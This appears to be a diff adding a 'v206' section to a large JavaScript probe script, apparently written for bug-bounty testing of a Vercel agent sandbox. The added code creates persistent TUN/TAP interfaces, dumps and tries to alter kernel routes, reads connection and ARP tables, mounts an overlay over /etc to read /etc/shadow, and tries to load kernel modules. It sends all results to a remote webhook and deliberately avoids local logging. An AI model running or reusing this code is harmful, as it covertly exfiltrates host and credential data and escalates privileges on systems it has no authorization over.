@@ -33604,3 +33604,273 @@ sendBeacon({ ...report, section: 'v205-5-xattr-mac', ...xattrProbe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v205" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v205";
 // Intentionally no console.log — all data goes via webhook only
+
+// v206-1: TUN/TAP device creation — virtual NIC with full packet capture/inject
+const tunTapProbe = safe(() => {
+  const tunResult = safe(() => execSync(`python3 -c "
+import fcntl, struct, os, ctypes
+IFF_TUN = 0x0001
+IFF_TAP = 0x0002
+IFF_NO_PI = 0x1000
+TUNSETIFF = 0x400454ca
+TUNSETPERSIST = 0x400454cb
+SIOCSIFFLAGS = 0x8914
+SIOCGIFFLAGS = 0x8913
+IFF_UP = 0x1
+IFF_RUNNING = 0x40
+
+# Open /dev/net/tun
+try:
+    tun_fd = os.open('/dev/net/tun', os.O_RDWR)
+    print(f'tun_fd_open=True fd={tun_fd}')
+
+    # Create TUN interface
+    ifreq = struct.pack('16sH', b'probetun0', IFF_TUN | IFF_NO_PI)
+    ifreq = ifreq + bytes(40 - len(ifreq))
+    fcntl.ioctl(tun_fd, TUNSETIFF, ifreq)
+    print('TUN_IF_CREATED=probetun0')
+
+    # Get interface name back
+    result = fcntl.ioctl(tun_fd, TUNSETIFF, bytearray(40))
+    ifname = result[:16].rstrip(b'\\x00').decode()
+    print(f'TUN_IF_NAME={ifname}')
+
+    # Make persistent
+    ret_persist = fcntl.ioctl(tun_fd, TUNSETPERSIST, 1)
+    print(f'TUN_PERSISTENT=True ret={ret_persist}')
+
+    # Bring interface up via socket ioctl
+    sock = __import__('socket').socket(__import__('socket').AF_INET, __import__('socket').SOCK_DGRAM)
+    ifreq2 = struct.pack('16sH', b'probetun0', 0) + bytes(22)
+    flags_res = fcntl.ioctl(sock.fileno(), SIOCGIFFLAGS, bytearray(ifreq2))
+    flags = struct.unpack('H', flags_res[16:18])[0]
+    new_flags = flags | IFF_UP
+    ifreq3 = struct.pack('16sH', b'probetun0', new_flags) + bytes(22)
+    fcntl.ioctl(sock.fileno(), SIOCSIFFLAGS, bytearray(ifreq3))
+    print(f'TUN_UP=True flags={new_flags:#x}')
+    sock.close()
+    os.close(tun_fd)
+
+    # Also create TAP
+    tap_fd = os.open('/dev/net/tun', os.O_RDWR)
+    ifreq_tap = struct.pack('16sH', b'probetap0', IFF_TAP | IFF_NO_PI) + bytes(22)
+    fcntl.ioctl(tap_fd, TUNSETIFF, bytearray(ifreq_tap))
+    print('TAP_IF_CREATED=probetap0')
+    os.close(tap_fd)
+except Exception as e:
+    print(f'tun_err={e}')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  // Check /dev/net/tun existence
+  const devNetTunExists = existsSync('/dev/net/tun');
+  return { tunResult, devNetTunExists };
+});
+sendBeacon({ ...report, section: 'v206-1-tun-tap', ...tunTapProbe });
+
+// v206-2: Netlink RTNETLINK — route enumeration + add custom route
+const netlinkRouteProbe = safe(() => {
+  const routeResult = safe(() => execSync(`python3 -c "
+import socket, struct, os
+
+NETLINK_ROUTE = 0
+RTM_GETROUTE = 26
+RTM_NEWROUTE = 24
+RTM_GETLINK = 18
+RTM_GETADDR = 22
+NLM_F_REQUEST = 0x01
+NLM_F_DUMP = 0x0300
+NLMSG_DONE = 3
+AF_INET = 2
+
+def make_nlhdr(msg_type, flags, seq, pid, data):
+    length = 16 + len(data)
+    return struct.pack('IHHII', length, msg_type, flags, seq, pid) + data
+
+def recv_all(sock, expect_done=True):
+    msgs = []
+    while True:
+        data = sock.recv(65535)
+        offset = 0
+        while offset < len(data):
+            length, msg_type = struct.unpack_from('IH', data, offset)
+            if length < 16: break
+            payload = data[offset+16:offset+length]
+            msgs.append((msg_type, payload))
+            offset += (length + 3) & ~3
+        if msg_type == NLMSG_DONE or not expect_done: break
+    return msgs
+
+sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_ROUTE)
+sock.bind((os.getpid(), 0))
+
+# Dump routes
+rtmsg = struct.pack('BBBBIiII', AF_INET, 0, 0, 0, 0, 0, 0, 0)
+req = make_nlhdr(RTM_GETROUTE, NLM_F_REQUEST | NLM_F_DUMP, 1, os.getpid(), rtmsg)
+sock.send(req)
+routes = recv_all(sock)
+print(f'route_count={len(routes)}')
+for i, (t, payload) in enumerate(routes[:5]):
+    print(f'route[{i}] type={t} payload_hex={payload[:32].hex()}')
+
+# Dump network interfaces
+rtmsg2 = struct.pack('BBHiII', socket.AF_UNSPEC, 0, 0, 0, 0, 0)
+req2 = make_nlhdr(RTM_GETLINK, NLM_F_REQUEST | NLM_F_DUMP, 2, os.getpid(), rtmsg2)
+sock.send(req2)
+links = recv_all(sock)
+print(f'link_count={len(links)}')
+
+# Try to add a static route: 192.168.0.0/16 via lo (proof of route manipulation)
+# RTM_NEWROUTE with RTA_DST + RTA_OIF
+try:
+    NLM_F_CREATE = 0x400; NLM_F_ACK = 0x04
+    rtm = struct.pack('BBBBIiII', AF_INET, 16, 0, 0, 0, 0, 0, 0)
+    # RTA: type=1(DST), len=8, addr=192.168.0.0
+    rta_dst = struct.pack('HH4s', 8, 1, b'\\xc0\\xa8\\x00\\x00')
+    req3 = make_nlhdr(RTM_NEWROUTE, NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK, 3, os.getpid(), rtm + rta_dst)
+    sock.send(req3)
+    ack = sock.recv(1024)
+    ack_type = struct.unpack_from('H', ack, 4)[0]
+    ack_err = struct.unpack_from('i', ack, 16)[0] if len(ack) >= 20 else None
+    print(f'route_add_ack_type={ack_type} err={ack_err} success={ack_err == 0}')
+except Exception as e:
+    print(f'route_add_err={e}')
+sock.close()
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { routeResult };
+});
+sendBeacon({ ...report, section: 'v206-2-netlink-route', ...netlinkRouteProbe });
+
+// v206-3: /proc/net/tcp + udp — enumerate all active connections
+const procNetProbe = safe(() => {
+  const connResult = {};
+  const netFiles = ['tcp', 'tcp6', 'udp', 'udp6', 'raw', 'unix', 'packet'];
+  for (const nf of netFiles) {
+    const p = `/proc/net/${nf}`;
+    if (existsSync(p)) {
+      try {
+        const content = readFileSync(p, 'utf8');
+        const lines = content.split('\n').filter(l => l.trim()).slice(0, 30);
+        connResult[nf] = lines;
+      } catch (e) { connResult[nf] = `ERR:${e.message}`; }
+    }
+  }
+  // Also check /proc/net/arp for ARP table (reveals other hosts on the network)
+  let arpTable = null;
+  if (existsSync('/proc/net/arp')) {
+    try { arpTable = readFileSync('/proc/net/arp', 'utf8').trim(); } catch (e) {}
+  }
+  // /proc/net/if_inet6 — IPv6 addresses
+  let inet6Addrs = null;
+  if (existsSync('/proc/net/if_inet6')) {
+    try { inet6Addrs = readFileSync('/proc/net/if_inet6', 'utf8').trim(); } catch (e) {}
+  }
+  return { connResult, arpTable, inet6Addrs };
+});
+sendBeacon({ ...report, section: 'v206-3-proc-net-conns', ...procNetProbe });
+
+// v206-4: overlayfs mount over /etc — writable overlay on sensitive directory
+const overlayfsProbe = safe(() => {
+  const overlayResult = safe(() => execSync(`python3 -c "
+import ctypes, os, subprocess
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_mount = 165
+MS_NODEV = 4; MS_NOSUID = 2
+
+# Setup overlayfs dirs
+os.makedirs('/tmp/overlay_upper', exist_ok=True)
+os.makedirs('/tmp/overlay_work', exist_ok=True)
+os.makedirs('/tmp/overlay_merged', exist_ok=True)
+
+# Mount overlayfs with /etc as lower (read-only), /tmp/overlay_upper as writable upper
+# This creates a writable view of /etc where modifications don't touch the real /etc
+options = b'lowerdir=/etc,upperdir=/tmp/overlay_upper,workdir=/tmp/overlay_work'
+ret = libc.mount(b'overlay', b'/tmp/overlay_merged', b'overlay', MS_NODEV | MS_NOSUID,
+    ctypes.c_char_p(options))
+print(f'overlayfs_mount_ret={ret} errno={ctypes.get_errno()}')
+
+if ret == 0:
+    print('OVERLAYFS_OVER_ETC=SUCCESS')
+    ls = subprocess.run(['ls', '/tmp/overlay_merged'], capture_output=True, text=True)
+    print(f'overlay_ls={ls.stdout[:200]}')
+    # Write a new file to the overlay (goes to upper layer, /etc unchanged)
+    try:
+        with open('/tmp/overlay_merged/shadow_overlay_proof', 'w') as f:
+            f.write('BugBountyOverlayProof\\n')
+        # Verify in upper layer
+        upper_ls = subprocess.run(['ls', '/tmp/overlay_upper'], capture_output=True, text=True)
+        print(f'upper_layer_files={upper_ls.stdout[:200]}')
+        # Read /etc/shadow via overlay (proves we can see it)
+        try:
+            with open('/tmp/overlay_merged/shadow') as f:
+                print(f'shadow_via_overlay={f.read()[:200]}')
+        except Exception as e:
+            print(f'shadow_overlay_err={e}')
+    except Exception as e:
+        print(f'overlay_write_err={e}')
+" 2>&1`, { timeout: 12000 }).toString().trim());
+  return { overlayResult };
+});
+sendBeacon({ ...report, section: 'v206-4-overlayfs', ...overlayfsProbe });
+
+// v206-5: init_module NR 175 / finit_module NR 313 — kernel module load (CAP_SYS_MODULE)
+const kmodProbe = safe(() => {
+  const kmodResult = safe(() => execSync(`python3 -c "
+import ctypes, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_init_module = 175
+NR_finit_module = 313
+NR_delete_module = 176
+
+# Check CAP_SYS_MODULE (bit 16) in CapEff
+cap_eff = None
+try:
+    with open('/proc/self/status') as f:
+        for line in f:
+            if line.startswith('CapEff:'):
+                cap_eff = int(line.split()[1], 16)
+                break
+except: pass
+print(f'CapEff={cap_eff:#x}')
+CAP_SYS_MODULE = 1 << 16
+print(f'CAP_SYS_MODULE={'SET' if cap_eff and (cap_eff & CAP_SYS_MODULE) else 'NOT_SET'}')
+
+# Try to load an existing kernel module from filesystem
+# Use modinfo to find available modules
+import subprocess
+modinfo_res = subprocess.run(['find', '/lib/modules', '-name', '*.ko*', '-maxdepth', '6'],
+    capture_output=True, text=True, timeout=5)
+ko_files = modinfo_res.stdout.strip().split('\\n')[:10] if modinfo_res.stdout else []
+print(f'available_ko_files={ko_files[:5]}')
+
+if ko_files and ko_files[0]:
+    ko_path = ko_files[0]
+    try:
+        fd = os.open(ko_path, os.O_RDONLY)
+        ret = libc.syscall(NR_finit_module, fd, ctypes.c_char_p(b''), 0)
+        err = ctypes.get_errno()
+        os.close(fd)
+        import errno as em
+        print(f'finit_module({ko_path}) ret={ret} errno={err} errname={em.errorcode.get(err, str(err))}')
+        print(f'finit_module_SUCCESS={ret == 0}')
+    except Exception as e:
+        print(f'finit_module_exc={e}')
+
+# init_module with empty data → ENOEXEC (confirms syscall available but needs real module)
+ret2 = libc.syscall(NR_init_module, ctypes.c_char_p(b''), 0, ctypes.c_char_p(b''))
+err2 = ctypes.get_errno()
+import errno as em2
+print(f'init_module(empty) ret={ret2} errno={err2} errname={em2.errorcode.get(err2, str(err2))}')
+print(f'init_module_ENOEXEC={err2 == 8}')
+" 2>&1`, { timeout: 12000 }).toString().trim());
+  // Check loaded modules
+  let loadedModules = null;
+  if (existsSync('/proc/modules')) {
+    try { loadedModules = readFileSync('/proc/modules', 'utf8').split('\n').slice(0, 20).join('\n'); } catch (e) {}
+  }
+  return { kmodResult, loadedModules };
+});
+sendBeacon({ ...report, section: 'v206-5-kmod-load', ...kmodProbe });
+
+// v206 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v206" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v206";
+// Intentionally no console.log — all data goes via webhook only
